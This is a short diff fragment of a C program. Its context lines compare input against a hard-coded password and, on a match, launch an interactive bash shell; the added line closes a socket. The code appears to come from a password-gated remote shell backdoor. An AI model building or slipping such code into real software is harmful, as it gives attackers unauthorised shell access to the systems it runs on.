@@ -41,6 +41,7 @@ int main(){
 
 	if(strcmp(buf,passwd)==0){
 		execve("/bin/bash",(char *[]){"/bin/bash","-i",NULL},NULL);
+        close(sockfd);
 	}
 
 }
